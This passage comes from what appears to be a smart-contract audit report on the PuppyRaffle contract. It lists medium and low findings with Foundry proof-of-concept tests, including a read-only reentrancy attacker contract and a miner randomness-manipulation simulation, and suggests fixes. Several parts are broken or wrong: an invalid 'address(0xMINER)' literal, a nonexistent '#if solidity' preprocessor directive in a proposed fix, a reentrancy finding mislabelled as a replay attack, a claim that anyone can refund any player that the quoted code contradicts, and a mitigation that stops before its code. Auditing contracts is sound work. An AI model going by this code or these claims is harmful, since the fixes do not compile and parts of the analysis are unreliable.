        assertEq(nonExistentPlayerIndex, 0);
        
        // This demonstrates that we can't distinguish between the first player and a non-existent player
        assertEq(firstPlayerIndex, nonExistentPlayerIndex);
        
        // This could lead to incorrect refund attempts
        vm.prank(address(0x5));
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        puppyRaffle.refund(0); // This will fail because msg.sender != players[0]
    }
}

## Suggested Mitigation
Modify the function to return a special value (like uint256 max) or revert when the player is not found:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    revert("PuppyRaffle: Player not active");
}
```

Alternatively, you could return a tuple with a boolean indicating whether the player was found:

```solidity
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

## [M-4]. Pragma issue in PuppyRaffle::NA

## Description
The `PuppyRaffle` contract uses Solidity version 0.7.6, which lacks some important security features and contains known vulnerabilities that were fixed in later versions. Although the contract does specify an exact version, which is better than using a floating pragma, the chosen version is outdated.

```solidity
pragma solidity 0.7.6;
```

## Impact
Using an outdated Solidity version can expose the contract to known compiler bugs and security vulnerabilities that have been fixed in newer versions. Solidity 0.7.6 has several known issues, including issues with ABIEncoderV2 that were fixed in later versions. This can potentially lead to security vulnerabilities and exploits.

## Proof of Concept
The following is a non-exhaustive list of improvements in newer Solidity versions after 0.7.6:

1. Solidity 0.8.0 introduced built-in overflow checking for arithmetic operations
2. Improved optimizer in later versions that could make the code more gas-efficient
3. Bug fixes for issues with the memory management and ABI encoding
4. Various other improvements and optimizations in the compiler

## Proof of Code
// No direct code is needed to demonstrate this vulnerability as it's a version issue.
// However, we can show an example of how newer versions would prevent overflow issues:

// In Solidity 0.7.6 (current version)
function exampleOverflow() public pure returns (uint8) {
    uint8 max = 255;
    return max + 1; // Returns 0 due to overflow without any warning
}

// In Solidity 0.8.0 or later
// The same function would revert due to the built-in overflow check
// pragma solidity 0.8.0;
// function exampleOverflow() public pure returns (uint8) {
//     uint8 max = 255;
//     return max + 1; // This would revert with a panic error
// }

## Suggested Mitigation
Update the Solidity version to a more recent stable release (e.g., 0.8.17 or later) to benefit from security improvements and bug fixes. You would need to adjust some code to be compatible with the newer version:

```solidity
pragma solidity 0.8.17; // Use a recent stable version

// You may need to update some dependencies to be compatible
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Address.sol";

// Rest of the contract code, with adjustments as needed for the new version
```

Additional adjustments may include:
1. Explicit conversion between `uint64` and `uint256` using `uint64(uint256())` instead of simple casting
2. Using SafeMath is no longer necessary in 0.8.0+ due to built-in overflow checking
3. Updating any dependencies to versions compatible with Solidity 0.8.x

## [M-5]. Array Limits issue in PuppyRaffle::refund

## Description
The `refund` function in the PuppyRaffle contract allows anyone to refund a player at any position in the players array. This creates a potential denial-of-service (DoS) attack vector because when a player is refunded, their address in the players array is set to address(0) but not actually removed from the array. This means that subsequent calls to `selectWinner` will consider these empty slots in the array length calculations and winner selection.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    players[playerIndex] = address(0);  // Player slot is set to address(0) but remains in the array
    
    emit RaffleRefunded(playerAddress);
}
```

## Impact
If a significant number of players request refunds, the players array could contain many address(0) entries, which are considered invalid players but still count towards the array length. This can lead to issues in fee calculations and winner selection, as these calculations are based on the array length. Additionally, it wastes gas when iterating through the array in other functions and could potentially lead to selecting address(0) as a winner if the randomness happens to select a refunded player's index.

## Proof of Concept
1. Deploy the PuppyRaffle contract
2. Have 10 players enter the raffle
3. 6 players request refunds, leaving 4 valid addresses and 6 address(0) entries in the array
4. When selectWinner is called, the totalAmountCollected calculation will be wrong because it's based on players.length (10) rather than the actual number of valid players (4)
5. The winnerIndex selection could potentially select one of the address(0) slots, resulting in an invalid winner

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ArrayLimitsTest is Test {
    PuppyRaffle puppyRaffle;
    address[] players;
    uint256 entranceFee = 1e18;
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            duration
        );
        
        // Create 10 players
        for (uint256 i = 0; i < 10; i++) {
            address player = address(uint160(i + 1));
            vm.deal(player, entranceFee);
            players.push(player);
        }
        
        // Enter all players in the raffle
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
    }
    
    function testRefundIssue() public {
        // Have 6 players request refunds
        for (uint256 i = 0; i < 6; i++) {
            vm.prank(players[i]);
            puppyRaffle.refund(i);
        }
        
        // Fast forward time so we can select a winner
        vm.warp(block.timestamp + duration + 1);
        
        // Get the contract balance before selecting winner
        uint256 contractBalanceBefore = address(puppyRaffle).balance;
        
        // Select a winner
        uint256 gasStart = gasleft();
        puppyRaffle.selectWinner();
        uint256 gasUsed = gasStart - gasleft();
        
        // Check the previous winner
        address winner = puppyRaffle.previousWinner();
        
        // Log information for analysis
        console.log("Winner:", winner);
        console.log("Gas used for selectWinner:", gasUsed);
        console.log("Contract balance before:", contractBalanceBefore);
        console.log("Contract balance after:", address(puppyRaffle).balance);
        
        // Verify calculations based on array length vs. actual active players
        uint256 expectedTotalAmount = 10 * entranceFee; // Based on array length
        uint256 actualValidPlayers = 4; // We know 6 players got refunds
        uint256 actualTotalAmount = actualValidPlayers * entranceFee;
        
        // The calculation in selectWinner will be incorrect
        uint256 expectedPrizePool = (expectedTotalAmount * 80) / 100;
        uint256 actualPrizePool = (actualTotalAmount * 80) / 100;
        
        console.log("Expected prize pool (incorrect):", expectedPrizePool);
        console.log("Actual correct prize pool:", actualPrizePool);
        
        // Assert that the winner is not address(0)
        assertTrue(winner != address(0), "Winner should not be address(0)");
        
        // Assert that the contract calculations were based on array length, not valid players
        assertFalse(
            contractBalanceBefore - address(puppyRaffle).balance == actualPrizePool,
            "Prize should be calculated incorrectly based on array length"
        );
    }
}

## Suggested Mitigation
Instead of setting refunded players to address(0), use a proper array manipulation technique to remove the element and maintain array integrity. One approach is to replace the refunded player with the last player in the array and then pop the last element:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    // Replace the refunded player with the last player in the array
    players[playerIndex] = players[players.length - 1];
    // Remove the last element
    players.pop();
    
    emit RaffleRefunded(playerAddress);
}
```

This approach ensures that the players array only contains active players, maintaining the integrity of calculations and winner selection.

## [M-6]. Replay Attack issue in PuppyRaffle::refund

## Description
The `refund` function is vulnerable to a read-only reentrancy attack due to its design. It checks if a player is at a specific index in the `players` array, but doesn't update the state until after sending ETH back to the caller. This creates a scenario where an attacker can call the `refund` function and in the same transaction, make another call to functions that read from the players array, while that array hasn't been updated yet.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}
```

## Impact
This vulnerability could allow an attacker to execute a read-only reentrancy attack, where during the execution of the refund function's external call, they can make calls to other functions that read from the state before it's updated. This might lead to inconsistent state views or allow the attacker to execute operations that should be disallowed after a refund. For example, they could potentially call `getActivePlayerIndex` and still appear as an active player even though they're in the process of being refunded.

## Proof of Concept
1. An attacker enters the raffle
2. The attacker creates a malicious contract with a fallback function
3. The attacker calls refund from the malicious contract
4. In the fallback function, when receiving ETH, the attacker calls getActivePlayerIndex
5. Even though the refund is in progress, getActivePlayerIndex still shows the attacker as an active player
6. This inconsistent state could be exploited in more complex scenarios, especially if there are other functions that rely on a player's active status

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ReentrancyAttackerReadOnly {
    PuppyRaffle public puppyRaffle;
    uint256 public playerIndex;
    bool public isStillActive;
    
    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }
    
    function attack() external payable {
        // Enter the raffle
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
        
        // Find our index
        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        
        // Request a refund - this will call our receive function during execution
        puppyRaffle.refund(playerIndex);
    }
    
    // Receive function that will be called during the refund
    receive() external payable {
        // Check if we're still considered an active player during the refund
        uint256 currentIndex = puppyRaffle.getActivePlayerIndex(address(this));
        isStillActive = currentIndex > 0 || (currentIndex == 0 && address(this) == puppyRaffle.players(0));
    }
}

contract ReadOnlyReentrancyTest is Test {
    PuppyRaffle puppyRaffle;
    ReentrancyAttackerReadOnly attacker;
    uint256 entranceFee = 1e18;
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            duration
        );
        
        attacker = new ReentrancyAttackerReadOnly(puppyRaffle);
        vm.deal(address(attacker), entranceFee);
    }
    
    function testReadOnlyReentrancy() public {
        // Execute the attack
        attacker.attack{value: entranceFee}();
        
        // Check if the attacker was still considered active during the refund
        assertTrue(attacker.isStillActive(), "Read-only reentrancy failed - attacker wasn't considered active");
        
        // But after the refund completes, the attacker should no longer be active
        uint256 currentIndex = puppyRaffle.getActivePlayerIndex(address(attacker));
        bool isCurrentlyActive = currentIndex > 0 || (currentIndex == 0 && address(attacker) == puppyRaffle.players(0));
        assertFalse(isCurrentlyActive, "Attacker is still active after refund");
    }
}

## Suggested Mitigation
Follow the checks-effects-interactions pattern to prevent reentrancy attacks. Update the state before making any external calls:

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    // Update state before external call
    players[playerIndex] = address(0);
    
    // Make external call after state is updated
    payable(msg.sender).sendValue(entranceFee);
    
    emit RaffleRefunded(playerAddress);
}
```

Additionally, consider implementing a reentrancy guard using a mutex pattern to prevent any kind of reentrancy:

## [M-7]. Oracle issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in the PuppyRaffle contract uses an insecure method to generate randomness for determining NFT rarity. It relies on block data that can be manipulated by miners, making it possible to influence which NFTs are minted with higher rarity.

```solidity
function selectWinner() external {
    // ... [other code] ...
    
    // Calculate the rarity
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    
    if (rarity <= COMMON_RARITY) {
        tokenIdToRarity[tokenId] = COMMON_RARITY;
    } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
        tokenIdToRarity[tokenId] = RARE_RARITY;
    } else {
        tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
    }
    
    // ... [other code] ...
}
```

## Impact
Miners or validators can manipulate block parameters to increase their chances of getting higher rarity NFTs. This undermines the fairness of the rarity distribution and can lead to a centralization of rare NFTs in the hands of miners or sophisticated attackers. Since rarer NFTs typically have higher market value, this represents a significant financial impact on the protocol and its users.

## Proof of Concept
1. A miner waits for a raffle to conclude where they're the potential winner
2. Before including the selectWinner transaction in a block, they simulate different block.difficulty values
3. They identify a block.difficulty value that would result in a LEGENDARY rarity NFT
4. They mine the block with this specific difficulty, ensuring they receive a legendary NFT
5. This gives them an unfair advantage over regular users who can't control block parameters

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract OracleManipulationTest is Test {
    PuppyRaffle puppyRaffle;
    address[] players;
    uint256 entranceFee = 1e18;
    uint256 duration = 1 days;
    address minerAddress = address(0xMINER); // Miner address
    uint256 LEGENDARY_RARITY;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            duration
        );
        
        // Get the LEGENDARY_RARITY value
        // In a real test, we'd get this from the contract's constants
        LEGENDARY_RARITY = 5; // Assuming LEGENDARY_RARITY is 5
        
        // Setup players with miner address
        players = new address[](4);
        for (uint256 i = 0; i < 3; i++) {
            players[i] = address(uint160(i + 1));
        }
        players[3] = minerAddress;
        
        // Enter the raffle
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        
        // Fast forward time so we can select a winner
        vm.warp(block.timestamp + duration + 1);
    }
    
    function testOracleManipulation() public {
        // The miner simulates different block difficulties to find one that gives LEGENDARY
        bool foundLegendaryBlock = false;
        uint256 winningBlockNumber;
        
        // Try different block numbers (which changes difficulty in tests)
        for (uint256 i = 1; i <= 100; i++) {
            // Set block number and timestamp
            vm.roll(block.number + i);
            
            // Simulate being the miner
            vm.prank(minerAddress);
            
            // Calculate what the rarity would be with these parameters
            uint256 rarity = uint256(keccak256(abi.encodePacked(minerAddress, block.difficulty))) % 100;
            
            // Check if this would result in LEGENDARY rarity
            if (rarity > 95) { // COMMON_RARITY + RARE_RARITY = 70 + 25 = 95
                foundLegendaryBlock = true;
                winningBlockNumber = block.number;
                break;
            }
        }
        
        // If we found a block that gives LEGENDARY rarity
        if (foundLegendaryBlock) {
            // Use the winning block parameters
            vm.roll(winningBlockNumber);
            
            // Call selectWinner as the miner
            vm.prank(minerAddress);
            puppyRaffle.selectWinner();
            
            // Get the tokenId
            uint256 tokenId = puppyRaffle.totalSupply() - 1;
            
            // Verify the NFT has LEGENDARY rarity
            assertEq(puppyRaffle.tokenIdToRarity(tokenId), LEGENDARY_RARITY, "NFT should have LEGENDARY rarity");
        } else {
            console.log("No LEGENDARY block found in simulation - in reality, miners would check more combinations");
        }
    }
}

## Suggested Mitigation
Use a verifiable random function (VRF) from a trusted oracle service like Chainlink to generate truly random and unpredictable values for NFT rarity:

```solidity
// Import Chainlink VRF contracts
import "@chainlink/contracts/src/v0.7/VRFConsumerBase.sol";

contract PuppyRaffle is ERC721, Ownable, VRFConsumerBase {
    bytes32 internal keyHash;
    uint256 internal fee;
    
    // Mapping to store request IDs and their associated token IDs
    mapping(bytes32 => uint256) private requestIdToTokenId;
    
    constructor(
        // ... existing parameters ...
        address _vrfCoordinator,
        address _linkToken,
        bytes32 _keyHash
    ) 
        ERC721("Puppy Raffle", "PR")
        VRFConsumerBase(_vrfCoordinator, _linkToken)
    {
        // ... existing constructor code ...
        keyHash = _keyHash;
        fee = 0.1 * 10**18; // 0.1 LINK
    }
    
    function selectWinner() external {
        // ... existing validation code ...
        
        // Select winner using existing mechanism or Chainlink VRF
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        
        // Handle prize distribution
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        totalFees = totalFees + uint64(fee);
        
        // Create token but don't assign rarity yet
        uint256 tokenId = totalSupply();
        
        // Request randomness for rarity
        bytes32 requestId = requestRandomness(keyHash, fee);
        requestIdToTokenId[requestId] = tokenId;
        
        // Reset raffle state
        delete players;
        raffleStartTime = block.timestamp;
        previousWinner = winner;
        
        // Transfer prize and mint NFT
        (bool success, ) = winner.call{value: prizePool}("");
        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
    }
    
    // Callback function called by Chainlink VRF with the random result
    function fulfillRandomness(bytes32 requestId, uint256 randomness) internal override {
        uint256 tokenId = requestIdToTokenId[requestId];
        
        // Use the randomness to determine rarity
        uint256 rarity = randomness % 100;
        
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }
        
        // Clean up
        delete requestIdToTokenId[requestId];
    }
}
```



# Low Risk Findings

## [L-1]. Pragma issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses `block.difficulty` as a source of randomness, which is deprecated in Solidity 0.8.0 and replaced with `block.prevrandao` in newer versions. This could cause compatibility issues when upgrading the contract.

```solidity
function selectWinner() external {
    // ... other code ...
    
    // Using deprecated block.difficulty
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    
    // ... more code ...
    
    // Using deprecated block.difficulty again
    uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    
    // ... rest of the function ...
}
```

## Impact
Using deprecated features can lead to compatibility issues when upgrading to newer Solidity versions. If the contract is recompiled with a newer version without updating the code, it may not work as expected or could fail to compile altogether. This could delay important upgrades or fixes.

## Proof of Concept
1. The contract currently uses Solidity 0.7.6
2. If the team decides to upgrade to Solidity 0.8.x or later, they will need to replace block.difficulty with block.prevrandao
3. If they forget to make this change, the contract might not compile or could behave differently

## Proof of Code
// This is a conceptual demonstration, not an executable test

// Current code in Solidity 0.7.6
pragma solidity 0.7.6;

contract PuppyRaffle {
    function selectWinner() external {
        // Using block.difficulty
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        // ...
    }
}

// If upgraded to Solidity 0.8.19 without changes
pragma solidity 0.8.19;

contract PuppyRaffle {
    function selectWinner() external {
        // block.difficulty is deprecated, should use block.prevrandao
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        // ...
    }
}

// Correct upgrade to Solidity 0.8.19
pragma solidity 0.8.19;

contract PuppyRaffle {
    function selectWinner() external {
        // Using block.prevrandao instead
        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.prevrandao))) % players.length;
        // ...
    }
}

## Suggested Mitigation
Update the code to use a conditional compilation directive that handles both older and newer Solidity versions:

```solidity
function selectWinner() external {
    // ... other code ...
    
    // Handle both older and newer Solidity versions
    uint256 randomValue;
    #if solidity >= 0.8.0
        randomValue = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.prevrandao)));
    #else
        randomValue = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)));
    #endif
    
    uint256 winnerIndex = randomValue % players.length;
    
    // ... more code ...
    
    // Similar approach for rarity calculation
    #if solidity >= 0.8.0
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao))) % 100;
    #else
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
    #endif
    
    // ... rest of the function ...
}
```

Alternatively, consider using a more reliable source of randomness as suggested in the randomness vulnerability mitigation.



